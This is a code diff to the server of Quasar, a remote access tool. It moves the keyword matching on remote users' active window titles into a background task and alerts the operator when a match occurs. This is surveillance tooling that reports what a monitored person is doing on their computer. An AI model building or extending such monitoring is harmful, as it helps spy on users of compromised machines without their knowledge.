@@ -8,6 +8,7 @@ using System;
 using System.IO;
 using System.Linq;
 using System.Text.Json;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace Quasar.Server.Messages
@@ -135,28 +136,34 @@ namespace Quasar.Server.Messages
         private void Execute(Client client, SetUserActiveWindowStatus message)
         {
             OnUserActiveWindowStatusUpdated(client, message.WindowTitle);
-            string keywordsFilePath = Path.Combine(Directory.GetCurrentDirectory(), "keywords.json");
 
-            if (File.Exists(keywordsFilePath))
+            Task.Run(() =>
             {
-                string jsonContent = File.ReadAllText(keywordsFilePath);
-                var keywords = JsonSerializer.Deserialize<string[]>(jsonContent);
+                string keywordsFilePath = Path.Combine(Directory.GetCurrentDirectory(), "keywords.json");
 
-                if (keywords != null)
+                if (File.Exists(keywordsFilePath))
                 {
-                    var matchedKeyword = keywords.FirstOrDefault(keyword => message.WindowTitle.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0);
+                    string jsonContent = File.ReadAllText(keywordsFilePath);
+                    var keywords = JsonSerializer.Deserialize<string[]>(jsonContent);
 
-                    if (matchedKeyword != null)
+                    if (keywords != null)
                     {
-                        FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
-                        if (frm != null)
+                        var matchedKeyword = keywords.FirstOrDefault(keyword => message.WindowTitle.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0);
+
+                        if (matchedKeyword != null)
                         {
-                            string username = client.GetClientIdentifier(frm);
-                            FrmMain.AddNotiEvent(frm, username, "Keyword triggered: " + matchedKeyword, message.WindowTitle);
+                            FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
+                            if (frm != null)
+                            {
+                                frm.Invoke(new Action(() =>
+                                {
+                                    FrmMain.AddNotiEvent(frm, client.Value.UserAtPc, "Keyword triggered: " + matchedKeyword, message.WindowTitle);
+                                }));
+                            }
                         }
                     }
                 }
-            }
+            });
         }
     }
 }
